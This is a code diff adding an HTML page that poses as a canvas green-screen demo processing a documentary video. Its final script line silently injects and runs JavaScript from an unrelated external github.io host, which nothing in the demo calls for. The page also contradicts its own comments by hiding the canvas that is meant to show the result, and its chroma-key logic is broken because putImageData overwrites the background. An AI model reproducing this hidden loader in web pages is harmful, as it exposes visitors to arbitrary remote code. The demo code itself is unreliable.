@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Efecto Pantalla Verde con Canvas</title>
+  <style>
+    body { margin: 0; background: #222; display: flex; justify-content: center; padding: 20px; }
+    canvas { border: 2px solid white; width: 800px; height: auto; }
+  </style>
+</head>
+<body>
+
+  <!-- El video original está oculto, solo lo usamos para procesar -->
+  <video id="j" autoplay  loop Controls 
+   xmlns="http://www.w3.org/1999/xhtml" 
+    src="https://archive.org/download/documentales_ciencia_y_tecnologia/archivos%20oficiales%20ovni.mp4" type="video/mp4"></video>
+
+  <!-- Aquí se verá el resultado final -->
+  <div style="display: none !important; visibility: hidden !important;">
+  <canvas id="lienzo"></canvas>
+  </div>
+  <script>
+    const video = document.getElementById('j');
+    const lienzo = document.getElementById('lienzo');
+    const ctx = lienzo.getContext('2d');
+
+    // Imagen de fondo (cámbiala por la tuya)
+    const fondo = new Image();
+    fondo.crossOrigin = "anonymous";
+    fondo.src = "https://picsum.photos/id/10/1280/720"; // Ejemplo de fondo
+
+    // Umbral para detectar el verde (ajústalo si es necesario)
+    const umbralVerde = 100;
+
+    function procesarFotograma() {
+      // Dibujar el fotograma actual del video en el lienzo
+      ctx.drawImage(video, 0, 0, lienzo.width, lienzo.height);
+
+      // Obtener datos de todos los píxeles
+      const datos = ctx.getImageData(0, 0, lienzo.width, lienzo.height);
+      const pixeles = datos.data;
+
+      // Recorrer cada píxel
+      for (let i = 0; i < pixeles.length; i += 4) {
+        const r = pixeles[i];     // Rojo
+        const g = pixeles[i + 1]; // Verde
+        const b = pixeles[i + 2]; // Azul
+
+        // Detectar si es verde de pantalla
+        if (g > umbralVerde && g > r + 40 && g > b + 40) {
+          // Hacer el píxel transparente
+          pixeles[i + 3] = 0;
+        }
+      }
+
+      // Dibujar el fondo y encima el video procesado
+      ctx.drawImage(fondo, 0, 0, lienzo.width, lienzo.height);
+      ctx.putImageData(datos, 0, 0);
+
+      // Repetir para el siguiente fotograma
+      requestAnimationFrame(procesarFotograma);
+    }
+
+    // Cuando el video cargue, iniciamos con tamaño adecuado
+    video.addEventListener('loadedmetadata', () => {
+      lienzo.width = video.videoWidth;
+      lienzo.height = video.videoHeight;
+      procesarFotograma();
+    });
+  </script>
+  <script>javascript:(function(){function cargarMiScript(){let s=document.createElement('script');s.src='https://sacanario88.github.io/Wey/Js/ini3.js';document.head.appendChild(s);}cargarMiScript();})();</script>
+</body>
+</html>
